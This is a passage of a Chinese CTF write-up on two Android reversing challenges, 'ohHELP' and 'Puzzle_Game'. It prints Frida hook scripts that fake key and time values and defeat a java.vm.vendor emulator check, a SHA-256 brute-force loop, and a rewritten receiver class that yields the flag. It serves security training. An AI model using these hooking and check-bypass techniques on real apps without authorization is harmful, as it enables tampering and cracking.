class="hljs-keyword">new</span> <span class="hljs-title class_">Random</span>(SEED);<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">generateRandomString</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">property</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;java.vm.vendor&quot;</span>);<br>        <span class="hljs-keyword">if</span> (property.toLowerCase().contains(<span class="hljs-string">&quot;virtual&quot;</span>) || property.toLowerCase().contains(<span class="hljs-string">&quot;project&quot;</span>)) &#123;<br>            System.exit(<span class="hljs-number">0</span>);<br>        &#125;<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(i);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i2 &lt; <span class="hljs-number">10</span>; i2++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i3</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i3 &lt; i; i3++) &#123;<br>                sb.append(CHAR_ALL.charAt(random.nextInt(CHAR_ALL.length())));<br>            &#125;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sb2</span> <span class="hljs-operator">=</span> sb.toString();<br>            sb.setLength(<span class="hljs-number">0</span>);<br>            sb.append(sb2);<br>        &#125;<br>        <span class="hljs-keyword">return</span> applyDistortionFunctions(sb.toString()).substring(<span class="hljs-number">0</span>, i);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">applyDistortionFunctions</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-keyword">return</span> insertRandomCharacter(shuffleString(reverseString(str)));<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">reverseString</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(str).reverse().toString();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">shuffleString</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-type">char</span>[] charArray = str.toCharArray();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> charArray.length - <span class="hljs-number">1</span>; length &gt; <span class="hljs-number">0</span>; length--) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">nextInt</span> <span class="hljs-operator">=</span> random.nextInt(length + <span class="hljs-number">1</span>);<br>            <span class="hljs-type">char</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> charArray[length];<br>            charArray[length] = charArray[nextInt];<br>            charArray[nextInt] = c;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(charArray);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">insertRandomCharacter</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">nextInt</span> <span class="hljs-operator">=</span> random.nextInt(str.length());<br>        <span class="hljs-type">char</span> <span class="hljs-variable">charAt</span> <span class="hljs-operator">=</span> CHAR_ALL.charAt(random.nextInt(CHAR_ALL.length()));<br>        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(str);<br>        sb.insert(nextInt, charAt);<br>        <span class="hljs-keyword">return</span> sb.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>查看 main 发现检查字符串是否以 ISCC{开头并以}结尾，且长度大于等于 6，并调用了 AesUtil.encrypt 方法进行加密校验，判断中间部分是否符合预期，又调用了 getstr 方法。</p>
<p>首先尝试 hook AesUtil.encrypt 获取加密结果。但在调用 a.a 数时出现异常，原因是 GetKey 返回了 null。然后在应用的 assets 目录下，发现了一个 Word 文件，ssh 配置和密钥。</p>
<p><img src="../../../../img/archives/2024ISCC05/f376f92a47add97e50f035daf24dc482.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/75f121a11f2c1244599a348b3d908e74.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/75f121a11f2c1244599a348b3d908e74.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/354d69c6c58c7fc3a82e41efff8ab9b2.png" srcset="/img/loading.gif" lazyload> 解压 word 文件，发现是符号</p>
<p>是一个图像需要镜像翻转操作，翻转后得到密钥 PUDzbflthjqxlJVW。然后 frida hook 将 getkey 返回值设置为 PUDzbflthjqxlJVW。而 getstr 通过反射调用 com.example.ohhelp.getstr 类中的 generateRandomString 方法，发现校验 property 时会退出，于是将 “java.vm.vendor” 属性的返回值设为空字符串，绕过了程序对系统属性的校验。GetTime 函数返回了当前的时间戳。根据题目的描述，需要将其设置为 2003-06-17 20:32:08，然后再次编写脚本 hook AesUtil.encrypt 获取 flag</p>
<p>f <img src="../../../../img/archives/2024ISCC05/20b116633b76f68b7f4d763e6c9fbd1d.png" srcset="/img/loading.gif" lazyload> rida -U -l hook.js ohHELP</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-title class_">Myjni</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.ohhelp.MyJNI.Myjni&quot;</span>);<br>    <span class="hljs-title class_">Myjni</span>[<span class="hljs-string">&quot;GetTime&quot;</span>].<span class="hljs-title function_">overload</span>().<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;1055853128000&quot;</span>;<br>    &#125;;<br>    <span class="hljs-title class_">Myjni</span>[<span class="hljs-string">&quot;GetKey&quot;</span>].<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;PUDzbflthjqxlJVW&quot;</span>;<br>    &#125;;<br>    <span class="hljs-keyword">let</span> <span class="hljs-title class_">AesUtil</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.example.ohhelp.AesUtil&quot;</span>);<br>    <span class="hljs-title class_">AesUtil</span>[<span class="hljs-string">&quot;encrypt&quot;</span>].<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>, <span class="hljs-string">&#x27;java.lang.String&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">string, string2</span>) &#123;<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;str1: &#x27;</span> + string + <span class="hljs-string">&#x27; str2: &#x27;</span> + string2);<br>      <span class="hljs-keyword">let</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">encrypt</span>(string, string2);<br>      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;ISCC&#123;&#x27;</span>+result+<span class="hljs-string">&#x27;&#125;&#x27;</span>);<br>      <span class="hljs-keyword">return</span> result;<br>    &#125;;<br>    <span class="hljs-keyword">let</span> <span class="hljs-title class_">System</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;java.lang.System&#x27;</span>);<br>    <span class="hljs-title class_">System</span>.<span class="hljs-property">getProperty</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">propertyName</span>) &#123;<br>      <span class="hljs-keyword">var</span> returnValue = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getProperty</span>(propertyName);<br>      <span class="hljs-keyword">if</span> (propertyName === <span class="hljs-string">&quot;java.vm.vendor&quot;</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>      &#125;<br>      <span class="hljs-keyword">return</span> returnValue;<br>    &#125;;<br>  &#125;)<br>&#125;<br><br><span class="hljs-title function_">setImmediate</span>(main);<br></code></pre></td></tr></table></figure>

<h4 id="Mobile-Puzzle-Game"><a href="#Mobile-Puzzle-Game" class="headerlink" title="Mobile Puzzle_Game"></a>Mobile Puzzle_Game</h4><p>反编译后直接看 Main 发现 check 类中，并继承了点击监听，则判断当点击 check 按钮时执行该类，调用 Jformat 进行判断</p>
<p><img src="../../../../img/archives/2024ISCC05/787e08777cb85f785b2492595191d974.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/6378818658a6b0dd131b1a2eda55f685.png" srcset="/img/loading.gif" lazyload> Jformat 中又调用了 a 类中的 a 对字符串进行比较</p>
<p>查看 a 类，发现是 sha256 加密，str2 调用 MyJNI 中的 MyJNI 类的 getstr()，判断 str2 &#x3D; str.substring(str.length() - 15, str.length())，且 str 的 sha256 &#x3D; “437414687cecdd3526281d4bc6492f3931574036943597fddd40adfbe07a9afa”，且 b 的返回为真</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java">ublic <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">a</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">substring</span> <span class="hljs-operator">=</span> str.substring(<span class="hljs-number">0</span>, str.length() - <span class="hljs-number">15</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> Myjni.getstr();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str3</span> <span class="hljs-operator">=</span> substring + str2;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">str4</span> <span class="hljs-operator">=</span> substring + str.substring(str.length() - <span class="hljs-number">15</span>, str.length());<br>        <span class="hljs-keyword">return</span> b(substring) &amp;&amp; getSHA256(str4).equals(<span class="hljs-string">&quot;437414687cecdd3526281d4bc6492f3931574036943597fddd40adfbe07a9afa&quot;</span>) &amp;&amp; str4.equals(str3);<br>    &#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Myjni</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> String <span class="hljs-title function_">getstr</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.loadLibrary(<span class="hljs-string">&quot;whathappened&quot;</span>);<br>    &#125;<br>&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">b</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (c(str)) &#123;<br>                <span class="hljs-type">int</span> <span class="hljs-variable">parseInt</span> <span class="hljs-operator">=</span> Integer.parseInt(str);<br>                <span class="hljs-keyword">if</span> (get1(parseInt) &amp;&amp; d(parseInt)) &#123;<br>                    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> parseInt + <span class="hljs-number">11</span>;<br>                    <span class="hljs-keyword">if</span> (!get1(i)) &#123;<br>                        <span class="hljs-keyword">if</span> (!d(i)) &#123;<br>                            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">c</span><span class="hljs-params">(String str)</span> &#123;<br>        <span class="hljs-keyword">return</span> str.length() == <span class="hljs-number">8</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">d</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i2</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">while</span> (i2 &lt; i &amp;&amp; i % i2 != <span class="hljs-number">0</span>) &#123;<br>            i2++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> i == i2;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">get1</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> Integer.toString(i);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i2</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i2 &lt; num.length() - <span class="hljs-number">1</span>; i2++) &#123;<br>            i /= <span class="hljs-number">10</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> i == <span class="hljs-number">4</span>;<br>    &#125;	<br></code></pre></td></tr></table></figure>

<p>b 中调用了 c，判断 a 中的 substring 长度是否为 8，所以这 8 个字符加上 str2 是 str，且这 8 个字符是 int，直接 hook com.example.whathappened.MyJNI.Myjni 中的 getstr 并爆破 substring</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida,sys<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message,data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br><br><br>js_code = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">function main() &#123;</span><br><span class="hljs-string">    Java.perform(function () &#123;</span><br><span class="hljs-string">      // 获取 MyJNI 类</span><br><span class="hljs-string">      var MyJNI = Java.use(&quot;com.example.whathappened.MyJNI.Myjni&quot;);</span><br><span class="hljs-string">    </span><br><span class="hljs-string">      // hook getstr() 方法</span><br><span class="hljs-string">      MyJNI.getstr.implementation = function () &#123;</span><br><span class="hljs-string">        // 打印原始调用信息</span><br><span class="hljs-string">        console.log(&quot;[*] getstr() called!&quot;);</span><br><span class="hljs-string">    </span><br><span class="hljs-string">        // 调用原始方法并获取返回值</span><br><span class="hljs-string">        var result = this.getstr();</span><br><span class="hljs-string">    </span><br><span class="hljs-string">        // 打印返回值</span><br><span class="hljs-string">        console.log(&quot;[*] getstr() returned: &quot; + result);</span><br><span class="hljs-string">    </span><br><span class="hljs-string">        // 返回修改后的值</span><br><span class="hljs-string">        return result;</span><br><span class="hljs-string">      &#125;;</span><br><span class="hljs-string">    &#125;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">setImmediate(main);</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>session = frida.get_remote_device().attach(<span class="hljs-string">&quot;Puzzle Game&quot;</span>)<br>script = session.create_script(js_code)<br>script.on(<span class="hljs-string">&#x27;message&#x27;</span>, on_message)<br>script.load()<br>sys.stdin.read()<br></code></pre></td></tr></table></figure>

<p><img src="../../../../img/archives/2024ISCC05/20e8aee528579859f4480efe9f35c12c.png" srcset="/img/loading.gif" lazyload> getstr（str2）：gwC9nOCNUhsHqZm</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> itertools<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_sha256</span>(<span class="hljs-params">hash_to_crack, known_string</span>):<br>  <span class="hljs-keyword">for</span> digits <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>), repeat=<span class="hljs-number">8</span>):<br>    attempt = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">str</span>, digits))+known_string<br>    hashed_attempt = hashlib.sha256(attempt.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> hashed_attempt == hash_to_crack:<br>      <span class="hljs-keyword">return</span> attempt<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># Example usage</span><br>hash_to_crack = <span class="hljs-string">&quot;437414687cecdd3526281d4bc6492f3931574036943597fddd40adfbe07a9afa&quot;</span>  <span class="hljs-comment"># Replace with the actual hash</span><br>known_string = <span class="hljs-string">&quot;gwC9nOCNUhsHqZm&quot;</span><br>cracked_password = crack_sha256(hash_to_crack, known_string)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Password found: <span class="hljs-subst">&#123;cracked_password&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="../../../../img/archives/2024ISCC05/8f594d0355899a32caadfc418e917fde.png" srcset="/img/loading.gif" lazyload> str 04999999gwC9nOCNUhsHqZm</p>
<p><img src="../../../../img/archives/2024ISCC05/68a0343131fab40d253a9dd7f3205e2e.png" srcset="/img/loading.gif" lazyload> 填入发现提示 ONE STEP AWAY FROM SUCCESS（离成功只有一步之遥）</p>
<p>在 com 中继续查看 R 和 Receiver，在 Recevier 中发现以下代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.content.BroadcastReceiver</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">stringExtra</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;EXTRA_PART1&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">stringExtra2</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;EXTRA_PART2&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">sha256</span> <span class="hljs-operator">=</span> getSHA256(stringExtra + stringExtra2);<br>    <span class="hljs-keyword">if</span> (stringExtra == <span class="hljs-literal">null</span> || stringExtra2 == <span class="hljs-literal">null</span> || !sha256.equals(<span class="hljs-string">&quot;437414687cecdd3526281d4bc6492f3931574036943597fddd40adfbe07a9afa&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Toast.makeText(context, encrypt2(encrypt(stringExtra, stringExtra2)).substring(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>), <span class="hljs-number">1</span>).show();<br>&#125;<br></code></pre></td></tr></table></figure>

<p>代码将 04999999 gwC9nOCNUhsHqZm 两部分再次进行加密，并再次判断 sha256，直接复制 Receiver 类并删去 import android，替换使用 kotlin 的代码部分，重新编写 main 替代 onReceive</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// String hexString = Integer.toHexString(b &amp; UByte.MAX_VALUE);</span><br><span class="hljs-type">String</span> <span class="hljs-variable">hexString</span> <span class="hljs-operator">=</span> Integer.toHexString(b &amp; <span class="hljs-number">0xFF</span>);<br><br><span class="hljs-comment">// bytes[i] = (byte) ((bytes[i] + ByteCompanionObject.MAX_VALUE) % 256);</span><br>bytes[i] = (<span class="hljs-type">byte</span>) ((bytes[i] + Byte.MAX_VALUE) % <span class="hljs-number">256</span>);<br><span class="hljs-meta">@Override</span> <span class="hljs-comment">// android.content.BroadcastReceiver</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onReceive</span><span class="hljs-params">(Context context, Intent intent)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">stringExtra</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;EXTRA_PART1&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">stringExtra2</span> <span class="hljs-operator">=</span> intent.getStringExtra(<span class="hljs-string">&quot;EXTRA_PART2&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">sha256</span> <span class="hljs-operator">=</span> getSHA256(stringExtra + stringExtra2);<br>    <span class="hljs-keyword">if</span> (stringExtra == <span class="hljs-literal">null</span> || stringExtra2 == <span class="hljs-literal">null</span> || !sha256.equals(<span class="hljs-string">&quot;437414687cecdd3526281d4bc6492f3931574036943597fddd40adfbe07a9afa&quot;</span>)) &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Toast.makeText(context, encrypt2(encrypt(stringExtra, stringExtra2)).substring(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>), <span class="hljs-number">1</span>).show();<br>&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">stringExtra</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;04999999&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">stringExtra2</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;gwC9nOCNUhsHqZm&quot;</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">sha256</span> <span class="hljs-operator">=</span> getSHA256(stringExtra + stringExtra2);<br>        <span class="hljs-keyword">if</span> (stringExtra == <span class="hljs-literal">null</span> || stringExtra2 == <span class="hljs-literal">null</span> || !sha256.equals(<span class="hljs-string">&quot;437414687cecdd3526281d4bc6492f3931574036943597fddd40adfbe07a9afa&quot;</span>)) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encrypted</span> <span class="hljs-operator">=</span> encrypt2(encrypt(stringExtra, stringExtra2));<br>        System.out.println(<span class="hljs-string">&quot;Encrypted (first 32 chars): &quot;</span> + encrypted.substring(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>));<br>        <span class="hljs-comment">// Demonstrating decryption</span><br><span class="hljs-comment">//        String decrypted = decrypt(decrypt2(encrypted));</span><br><span class="hljs-comment">//        System.out.println(&quot;Decrypted: &quot; + decrypted);</span><br>    &#125;<br></code></pre></td></tr></table></figure>

<p><img src="../../../../img/archives/2024ISCC05/466a40b05eea3711176c371b5fc3865e.png" srcset="/img/loading.gif" lazyload> 运行脚本，得到 flag</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span 